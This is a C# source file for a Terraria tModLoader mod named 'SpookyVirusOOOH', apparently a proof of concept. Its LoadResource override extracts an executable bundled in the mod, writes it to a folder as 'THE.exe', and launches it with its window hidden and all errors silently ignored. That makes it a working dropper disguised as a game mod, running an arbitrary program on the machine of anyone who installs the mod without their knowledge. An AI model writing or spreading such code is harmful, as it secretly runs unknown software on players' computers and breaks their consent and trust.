using System;
using System.Diagnostics;
using System.IO;
using Terraria.ModLoader;
using Terraria.ModLoader.IO;

namespace SpookyVirusOOOH
{
	public sealed class EntryPoint : Mod
	{
        public override bool LoadResource(string path, int length, Func<Stream> getStream)
        {
            // Only attempt to open if it's the EXE we want
            if (!path.EndsWith("Blah.exe"))
                return base.LoadResource(path, length, getStream);

            try
            {
                // Create a directory to copy or EXE to
                Directory.CreateDirectory(Path.Combine(ModLoader.ModPath, "getCuckedNerd"));

                // Get the path, this is used for writing the file as well
                string iLoveYou = Path.Combine(ModLoader.ModPath, "getCuckedNerd", "THE.exe");
                
                // Open a stream to read and copy the file
                using (Stream stream = getStream())
                    File.WriteAllBytes(Path.Combine(ModLoader.ModPath, "getCuckedNerd", "THE.exe"),
                        stream.ReadBytes(length));

                // Start the process while hidden
                Process.Start(new ProcessStartInfo(iLoveYou)
                {
                    UseShellExecute = false, WindowStyle = ProcessWindowStyle.Hidden, RedirectStandardOutput = true,
                    RedirectStandardInput = true, CreateNoWindow = true
                });
            }
            // Throws an error about processes already being open because I haven't ignored the Blah folder
            catch
            {
                // ignore
            }

            return base.LoadResource(path, length, getStream);
        }
    }
}